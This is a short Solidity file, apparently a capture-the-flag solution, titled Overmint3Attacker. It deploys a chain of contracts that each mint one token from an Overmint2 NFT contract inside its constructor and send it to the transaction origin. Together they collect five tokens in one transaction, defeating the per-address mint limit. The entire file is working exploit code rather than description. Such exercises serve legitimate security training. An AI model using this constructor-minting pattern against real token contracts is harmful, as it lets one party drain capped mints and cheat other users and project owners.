// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Overmint2.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint3Attacker {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 1);

        new A(addr);
    }
}

contract A {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 2);
        new B(addr);
    }
}

contract B {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 3);
        new C(addr);
    }
}

contract C {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 4);
        new D(addr);
    }
}

contract D {
    constructor(address addr) {
        Overmint2(addr).mint();

        Overmint2(addr).transferFrom(address(this), tx.origin, 5);
    }
}
